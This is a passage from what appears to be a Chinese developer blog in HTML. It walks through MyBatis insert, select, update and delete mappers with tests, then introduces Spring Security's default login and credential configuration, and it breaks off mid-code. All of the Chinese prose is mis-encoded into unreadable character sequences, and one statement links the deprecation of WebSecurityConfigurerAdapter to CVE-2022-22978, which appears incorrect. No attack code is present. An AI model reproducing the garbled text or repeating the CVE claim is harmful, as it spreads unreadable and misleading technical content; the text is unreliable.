href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h2><p>å…ˆç¨å¾®copyä¸€ä¸‹å¢åˆ æŸ¥æ”¹å§ï¼Œç°åœ¨å®åœ¨ä¸æƒ³ç¢°æ•°æ®åº“</p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>å†™UserMapper.xmlçš„æ—¶å€™æœ‰ä¸ª<code>select</code>æ ‡ç­¾ï¼Œé‡Œé¢æœ‰å‡ ä¸ªå±æ€§ï¼š</p><ul><li>id: å¯¹åº”çš„å°±æ˜¯æ¥å£ä¸­çš„æ–¹æ³•åç§°ï¼ˆç­‰æ•ˆäºJDBCä¸­çš„å®ç°æ¥å£ï¼‰</li><li>resultType: sqlæ‰§è¡Œè¯­å¥çš„è¿”å›å€¼ç±»å‹</li><li>parameterTypeï¼šå‚æ•°ç±»å‹</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.dao.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserlist<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select * from user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--è¡¥å……ä¸€ä¸ªgetuserbyidçš„selectæ ‡ç­¾--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserbyid<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">User</span> user <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>      sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">getuserlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ ¹æ®IDè¿”å›æ•°æ®</span>    <span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ·»åŠ ç”¨æˆ·</span>    <span class="token class-name">Boolean</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.dao.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserlist<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--è¡¥å……ä¸€ä¸ªgetuserbyidçš„selectæ ‡ç­¾--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserbyid<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>adduser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        insert into mybatis.user(id,name,pwd) values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;);    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Boolean</span> adduser <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">adduser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"Boogipop2"</span><span class="token punctuation">,</span> <span class="token string">"2662501"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>adduser<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ·»åŠ æˆåŠŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    sqlSession<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æäº¤äº‹åŠ¡ï¼Œæ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™ä¸ä¼šæ·»åŠ </span>    sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">getuserlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ ¹æ®IDè¿”å›æ•°æ®</span>    <span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ·»åŠ ç”¨æˆ·</span>    <span class="token class-name">Boolean</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//åˆ é™¤ç”¨æˆ·</span>    <span class="token class-name">Boolean</span> <span class="token function">deluser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.dao.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserlist<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--è¡¥å……ä¸€ä¸ªgetuserbyidçš„selectæ ‡ç­¾--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getuserbyid<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>adduser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        insert into mybatis.user(id,name,pwd) values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;);    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delete</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>deluser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        delete from user where id=#&#123;id&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>delete</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deluser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Boolean</span> deluser<span class="token operator">=</span>mapper<span class="token punctuation">.</span><span class="token function">deluser</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>deluser<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"åˆ é™¤æˆåŠŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      sqlSession<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æäº¤äº‹åŠ¡</span>      sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>dao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>kino<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">getuserlist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ ¹æ®IDè¿”å›æ•°æ®</span>    <span class="token class-name">User</span> <span class="token function">getuserbyid</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ·»åŠ ç”¨æˆ·</span>    <span class="token class-name">Boolean</span> <span class="token function">adduser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//åˆ é™¤ç”¨æˆ·</span>    <span class="token class-name">Boolean</span> <span class="token function">deluser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//æ›´æ–°ç”¨æˆ·</span>    <span class="token class-name">Boolean</span> <span class="token function">cguser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>update</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cguser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.kino.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>       update user set name=#&#123;name&#125;,pwd=#&#123;pwd&#125; where id=#&#123;id&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>update</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">cguser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token class-name">SqlSession</span> sqlSession<span class="token operator">=</span><span class="token class-name">MybatisUtil</span><span class="token punctuation">.</span><span class="token function">getSqlsession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">Boolean</span> cguser<span class="token operator">=</span>mapper<span class="token punctuation">.</span><span class="token function">cguser</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"Kino2!"</span><span class="token punctuation">,</span><span class="token string">"asdasdasd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>cguser<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ›´æ–°æˆåŠŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       sqlSession<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æäº¤äº‹åŠ¡</span>       sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="SpringSecurity"><a href="#SpringSecurity" class="headerlink" title="SpringSecurity"></a>SpringSecurity</h2><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/lenve/p/11242055.html">https://www.cnblogs.com/lenve/p/11242055.html</a></p><blockquote><p>SpringSecurity æ˜¯åœ¨javaå¼€å‘ä¸­å¾ˆå¸¸ç”¨çš„ä¸€ä¸ªåº“ï¼Œç”¨äºèº«ä»½éªŒè¯ã€æˆæƒå’Œå®‰å…¨æ€§ç­‰åŠŸèƒ½ä¸Š</p></blockquote><p><img src="/blog/2024/06/28/SpringBoot/image-20240714234715229.png" alt="image-20240714234715229"></p><p>åˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œå¯¼å…¥Spring Securityçš„ä¾èµ–</p><p>ç„¶åå†™ä¸€ä¸ªæ™®é€šçš„æ§åˆ¶å™¨</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715000538588.png" alt="image-20240715000538588"></p><p>æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬ç›´æ¥è®¿é—®&#x2F;helloå°±èƒ½è¿›å…¥HelloController</p><p>ä½†æ˜¯è¿™è¾¹æˆ‘ä»¬å¼•å…¥äº†Spring Securityï¼Œå½“æˆ‘ä»¬å°è¯•è®¿é—®&#x2F;helloçš„æ—¶å€™å°±ä¼šç›´æ¥è·³è½¬åˆ°Spring Securityè‡ªå¸¦çš„&#x2F;login</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240714235440408.png" alt="image-20240714235440408"></p><p>ä¸ºäº†ç™»å½•è¿›å»ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ç”¨æˆ·åå¯†ç ï¼Œspring security é»˜è®¤çš„ç”¨æˆ·åæ˜¯<code>user</code>ï¼Œspring securityå¯åŠ¨çš„æ—¶å€™ä¼šç”Ÿæˆé»˜è®¤å¯†ç ï¼ˆåœ¨å¯åŠ¨æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°ï¼‰</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715000601331.png" alt="image-20240715000601331"></p><p>è¿™é‡Œæ˜¯<code>890068b6-eb15-424a-a100-5df9b11cbdbc</code></p><p>è¾“å…¥é”™è¯¯çš„è¯ä¼šè¿”å›<code>Bad credentials</code></p><p>ç™»å½•åå°±ä¼š302è·³è½¬åˆ°åŸæ¥è¦è®¿é—®çš„è·¯ç”±</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715000646480.png" alt="image-20240715000646480"></p><h3 id="è´¦å¯†é…ç½®"><a href="#è´¦å¯†é…ç½®" class="headerlink" title="è´¦å¯†é…ç½®"></a>è´¦å¯†é…ç½®</h3><p>è¿™ä¸ªç™»å½•çš„å¯†ç æ˜¯éšæœºç”Ÿæˆçš„ï¼Œæ¯æ¬¡å¯åŠ¨æ—¶éƒ½ä¼šå˜ã€‚å¯¹ç™»å½•çš„ç”¨æˆ·å&#x2F;å¯†ç è¿›è¡Œé…ç½®ï¼Œæœ‰ä¸‰ç§ä¸åŒçš„æ–¹å¼ï¼š</p><ul><li><p><strong>åœ¨ application.properties ä¸­è¿›è¡Œé…ç½®</strong></p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">spring.security.user.name</span><span class="token punctuation">=</span><span class="token value attr-value">gbc</span><span class="token key attr-name">sprint.security.user.roles</span><span class="token punctuation">=</span><span class="token value attr-value">admin</span><span class="token key attr-name">spring.security.user.password</span><span class="token punctuation">=</span><span class="token value attr-value">486</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ–¹æ³•è²Œä¼¼åªèƒ½è®¾ç½®ä¸€ä¸ªç”¨æˆ·</p></li><li><p><strong>é€šè¿‡ Java ä»£ç é…ç½®åœ¨å†…å­˜ä¸­</strong>ï¼šå³ç¡¬ç¼–ç </p><p>åˆ›å»ºä¸€ä¸ª Spring Security çš„é…ç½®ç±»ï¼Œç»§æ‰¿è‡ª <code>WebSecurityConfigurerAdapter</code> ç±»ï¼Œä½†æ˜¯å› ä¸ºCVE-2022-22978ï¼ŒSpring Security 5.7ï¼ˆSpringboot3åï¼‰åŠä¹‹åçš„ç‰ˆæœ¬ä¸­<code>WebSecurityConfigurerAdapter</code>è¢«å¼ƒç”¨äº†ï¼Œè¦ä½¿ç”¨çš„è¯springbootç‰ˆæœ¬å¾—å›é€€åˆ°2.x</p><p>äºæ˜¯æˆ‘ä»¬å›é€€åˆ°2.xç‰ˆæœ¬ï¼Œåˆ›å»ºSecurityConfig</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecuritydemo<span class="token punctuation">.</span></span><span class="token class-name">Config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">AuthenticationManagerBuilder</span> auth<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token 